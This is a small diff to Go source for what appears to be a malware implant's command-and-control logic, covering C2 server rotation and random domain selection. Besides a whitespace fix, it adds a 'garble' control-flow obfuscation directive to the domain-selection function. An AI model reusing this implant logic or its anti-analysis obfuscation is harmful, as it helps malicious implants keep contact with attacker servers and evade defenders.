@@ -91,7 +91,7 @@ func C2Generator(abort <-chan struct{}, temporaryC2 ...string) <-chan *url.URL {
 				next = c2Servers[c2Counter%uint(len(c2Servers))]()
 			}
 
-			// check if reconfig used to set a new C2-URI 
+			// check if reconfig used to set a new C2-URI
 			if dynamic := GetC2URI(); dynamic != "" {
 				next = dynamic
 			}
@@ -127,6 +127,8 @@ func C2Generator(abort <-chan struct{}, temporaryC2 ...string) <-chan *url.URL {
 }
 
 // randomCCDomain - Random selection within a protocol
+//
+//garble:controlflow block_splits=2 junk_jumps=2 flatten_passes=1 flatten_hardening=xor trash_blocks=0
 func randomCCDomain(ccServers []func() string, next string) string {
 	uri, err := url.Parse(next)
 	if err != nil {
